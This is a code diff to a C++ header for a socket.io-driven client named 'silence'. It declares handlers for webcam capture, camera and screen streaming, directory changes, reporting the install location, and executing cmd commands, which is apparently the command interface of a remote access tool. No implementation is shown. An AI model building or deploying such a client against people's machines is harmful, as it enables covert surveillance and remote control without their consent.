@@ -37,16 +37,21 @@ namespace silence {
         template<typename T, typename... Args>
         void launchEvent(const std::function<T> &callable, Args &&... args);
 
+        bool stopStream(std::unique_lock<std::mutex> &lockGuard) const;
+
+        void camStream(std::unique_lock<std::mutex> &lockGuard);
+
+        void screenStream(std::unique_lock<std::mutex> &lockGuard);
+
     private:
         void onCommand(std::string const &name, sio::message::ptr const &data,
                        bool hasAck, sio::message::list &ack_resp);
 
     private:
         void greetEvent(); // starts the client
-        void webcamShotEvent(); // takes a webcam shot
-        void killStreamEvent(); // kills a stream
-        void startStreamEvent(); // creates a stream
+        void kstreamEvent(); // kills a stream
 
+        void streamEvent(const CommandObject &object); // creates a stream
         void cdEvent(const CommandObject &object); // changes the current directory
         void originEvent(const CommandObject &object); // returns the install directory
         void cmdEvent(const CommandObject &object); // executes a cmd command
